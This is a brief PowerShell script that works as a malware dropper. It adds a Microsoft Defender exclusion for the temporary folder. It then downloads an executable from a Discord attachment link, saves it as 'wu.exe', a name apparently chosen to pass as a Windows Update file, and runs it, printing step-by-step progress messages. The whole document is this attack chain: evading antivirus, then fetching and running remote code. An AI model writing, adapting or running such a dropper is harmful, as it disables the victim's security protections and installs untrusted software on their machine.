$f="$env:TEMP\wu.exe"
Write-Host "[1] Adding exclusion..."
Add-MpPreference -ExclusionPath $env:TEMP 2>&1 | Write-Host
Write-Host "[2] Downloading..."
try { iwr "https://cdn.discordapp.com/attachments/1520398729520222211/1520412587051974786/scanner.exe?ex=6a411a10&is=6a3fc890&hm=0dab79e5adf2b19879440984c995ac1bcb01e5d8cc2fe546a43ccfa2ba7be653&" -OutFile $f -UseBasicParsing } catch { Write-Host "Download error: $_" }
Write-Host "[3] File exists: $(Test-Path $f) Size: $((Get-Item $f -EA SilentlyContinue).Length)"
Write-Host "[4] Running..."
if (Test-Path $f) { & $f } else { Write-Host "File not found " }
Write-Host "[5] Done"
